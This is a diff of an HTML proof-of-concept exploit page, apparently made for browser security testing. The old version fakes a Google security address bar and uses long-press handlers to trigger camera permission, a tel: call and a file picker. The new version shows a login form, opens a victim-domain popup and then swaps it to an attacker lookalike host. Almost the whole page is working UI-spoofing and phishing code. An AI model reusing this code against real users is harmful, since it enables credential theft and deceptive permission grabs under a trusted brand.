@@ -1,269 +1,136 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Permission & File Picker PoC</title>
+    <title>Advanced Custom Tab Spoofing PoC (Bypass Test)</title>
     <style>
-        :root {
-            --primary-color: #1a73e8;
-            --primary-hover: #1557b0;
-            --bg-color: #f8f9fa;
-            --text-color: #202124;
-            --border-color: #dadce0;
-            --muted-color: #5f6368;
-        }
-
         body {
+            margin: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
+            background-color: #f8f9fa;
+            color: #202124;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            margin: 0;
             padding: 20px;
-            padding-top: 75px;
             text-align: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 360px;
+            background: #ffffff;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
             box-sizing: border-box;
         }
-
-        /* Fake Address Bar Overlay */
-        .fake-address-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 56px;
-            background-color: #ffffff;
-            border-bottom: 1px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 0 16px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
-            z-index: 9999;
-            box-sizing: border-box;
+        h1 {
+            font-size: 18px;
+            color: #1a73e8;
+            margin-bottom: 16px;
         }
-
-        .fake-url-container {
-            background-color: #f1f3f4;
-            border-radius: 20px;
-            padding: 8px 16px;
-            width: 100%;
-            max-width: 600px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .warning-banner {
+            background-color: #b00020;
+            color: #ffffff;
+            padding: 12px;
+            border-radius: 8px;
             font-size: 13px;
-        }
-
-        .lock-icon {
-            margin-right: 6px;
-        }
-
-        .url-text {
-            color: #137333;
+            word-break: break-all;
+            margin-top: 20px;
             font-weight: 500;
         }
-
-        .url-domain {
-            color: var(--text-color);
-            font-weight: 400;
+        .status-log {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: left;
+            background: #f1f3f4;
+            padding: 10px;
+            border-radius: 6px;
+            max-height: 100px;
+            overflow-y: auto;
         }
-
-        .banner {
-            font-size: 13px;
-            color: var(--muted-color);
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            font-weight: 600;
-        }
-
-        h1 {
-            font-size: 20px;
-            color: var(--primary-color);
-            margin-bottom: 24px;
-        }
-
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
+        input {
             width: 100%;
-            max-width: 340px;
-        }
-
-        a.spoof-link {
-            display: inline-block;
-            background-color: var(--primary-color);
-            color: white;
-            padding: 14px 20px;
-            text-decoration: none;
-            font-weight: 600;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dadce0;
+            border-radius: 6px;
+            box-sizing: border-box;
             font-size: 14px;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
-            transition: background-color 0.2s, transform 0.1s;
-            cursor: pointer;
         }
-
-        a.spoof-link:active {
-            background-color: var(--primary-hover);
-            transform: scale(0.98);
-        }
-
-        .preview-container {
-            margin-top: 25px;
-            max-width: 280px;
-            display: none;
-        }
-
-        .preview-container img {
+        button {
             width: 100%;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
-        }
-
-        .file-info {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
             margin-top: 10px;
-            font-size: 13px;
-            color: var(--muted-color);
-            word-break: break-all;
-            padding: 0 10px;
         }
-
-        .footer-note {
-            margin-top: 30px;
-            font-size: 11px;
-            color: #9aa0a6;
+        button:active {
+            background-color: #1557b0;
         }
     </style>
 </head>
 <body>
 
-    <!-- Fake Address Bar -->
-    <div class="fake-address-bar">
-        <div class="fake-url-container">
-            <span class="lock-icon">🔒</span>
-            <span class="url-text">https://</span><span class="url-domain">security.google.com/verify/token</span>
+    <div class="container">
+        <h1>Secure Account Verification</h1>
+        <input type="text" placeholder="Enter Username / Email" value="user@secure-portal.local">
+        <input type="password" placeholder="Enter Password" value="••••••••••••">
+        <button id="triggerBtn">Initialize Secure Session</button>
+
+        <div class="status-log" id="logBox">Status: Ready for interaction...</div>
+        <div class="warning-banner" id="warningBanner" style="display: none;">
+            ATTACKER PAYLOAD ACTIVE<br>Real Host: <span id="realHostDisplay"></span>
         </div>
     </div>
 
-    <div class="banner">Google Security Portal</div>
-    <h1>Secure Document Verification</h1>
-
-    <!-- Container dengan Tombol Izin Kamera, Tel, & File Picker -->
-    <div class="button-container">
-        <a href="https://google.com" class="spoof-link" id="targetLinkCamera" data-intent="camera_verification">Open Window & Request Camera Access</a>
-        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
-        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
-    </div>
-
-    <!-- Preview Box -->
-    <div class="preview-container" id="previewBox">
-        <img id="imagePreview" src="" alt="File Preview">
-        <div class="file-info" id="fileInfo"></div>
-    </div>
-
-    <div class="footer-note">Cloud-secured verification system.</div>
-
     <script>
-        let triggered = false;
+        const logBox = document.getElementById("logBox");
+        function appendLog(msg) {
+            logBox.textContent += "\n> " + msg;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
 
-        const executeAttackVector = (actionType, intent) => {
-            if (triggered) return;
-            triggered = true;
+        // Parameter dinamis dari URL (mendukung simulasi lintas-asal)
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetVictimHost = urlParams.get('a') || "detectportal.firefox.com";
+        const targetEvilHost = urlParams.get('b') || "detectportal.firefox.com.evil.localtest.me";
+        const delayTime = parseInt(urlParams.get('d')) || 4000;
 
-            // Timer optimized to match animation/interaction flow
-            setTimeout(async () => {
+        document.getElementById("realHostDisplay").textContent = window.location.host;
+
+        document.getElementById("triggerBtn").addEventListener("click", () => {
+            appendLog("Triggering popup window open -> " + targetVictimHost);
+            
+            // Variasi Varian 2: window.open ke domain korban
+            let openedWindow = window.open("http://" + targetVictimHost + "/", "_blank");
+
+            setTimeout(() => {
                 try {
-                    const previewBox = document.getElementById("previewBox");
-                    const imagePreview = document.getElementById("imagePreview");
-                    const fileInfo = document.getElementById("fileInfo");
-
-                    if (actionType === 'camera') {
-                        // Meminta izin akses kamera perangkat secara langsung
-                        const constraints = { video: { facingMode: 'user' } };
-                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                        
-                        fileInfo.innerText = `Camera permission granted for intent: [${intent}]`;
-                        imagePreview.src = "";
-                        previewBox.style.display = "block";
-
-                        // Hentikan stream setelah izin didapat agar lampu indikator kamera mati kembali
-                        stream.getTracks().forEach(track => track.stop());
-                    } 
-                    else if (actionType === 'tel') {
-                        window.location.href = "tel:+18005550199";
-                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
-                        imagePreview.src = "";
-                        previewBox.style.display = "block";
-                    } 
-                    else if (actionType === 'filepicker') {
-                        // Menggunakan File System Access API
-                        const [fileHandle] = await window.showOpenFilePicker({
-                            multiple: false,
-                            types: [{
-                                description: 'Images & Documents',
-                                accept: { 
-                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
-                                    'application/pdf': ['.pdf']
-                                }
-                            }]
-                        });
-
-                        const file = await fileHandle.getFile();
-                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
-
-                        if (file.type.startsWith('image/')) {
-                            imagePreview.src = URL.createObjectURL(file);
-                            previewBox.style.display = "block";
-                        } else {
-                            imagePreview.src = "";
-                            previewBox.style.display = "block";
-                        }
+                    appendLog("Executing location mutation to bypass cache offset...");
+                    
+                    // Teknik manipulasi untuk memaksa pembaruan origin state
+                    if (openedWindow) {
+                        openedWindow.location.href = "http://" + targetEvilHost + "/?bypass=true";
+                        appendLog("Location redirected to attacker zone.");
+                    } else {
+                        // Fallback untuk single-tab navigation
+                        window.location.href = "http://" + targetEvilHost + "/?bypass=true";
                     }
-
                 } catch (err) {
-                    console.debug("Handler cancelled or blocked:", err.message);
-                } finally {
-                    setTimeout(() => { triggered = false; }, 1000);
+                    appendLog("ERR: " + err.message);
                 }
-            }, 2400);
-        };
-
-        // Event listener untuk Tombol Camera Permission
-        const linkCamera = document.getElementById("targetLinkCamera");
-        if (linkCamera) {
-            linkCamera.addEventListener("contextmenu", (e) => {
-                executeAttackVector('camera', linkCamera.getAttribute('data-intent'));
-            });
-            linkCamera.addEventListener("touchstart", () => {}, { passive: true });
-        }
-
-        // Event listener untuk Tombol Tel
-        const linkTel = document.getElementById("targetLinkTel");
-        if (linkTel) {
-            linkTel.addEventListener("contextmenu", (e) => {
-                executeAttackVector('tel', linkTel.getAttribute('data-intent'));
-            });
-            linkTel.addEventListener("touchstart", () => {}, { passive: true });
-        }
-
-        // Event listener untuk Tombol File Picker
-        const linkFile = document.getElementById("targetLinkFile");
-        if (linkFile) {
-            linkFile.addEventListener("contextmenu", (e) => {
-                executeAttackVector('filepicker', linkFile.getAttribute('data-intent'));
-            });
-            linkFile.addEventListener("touchstart", () => {}, { passive: true });
-        }
+            }, delayTime);
+        });
     </script>
-
 </body>
 </html>
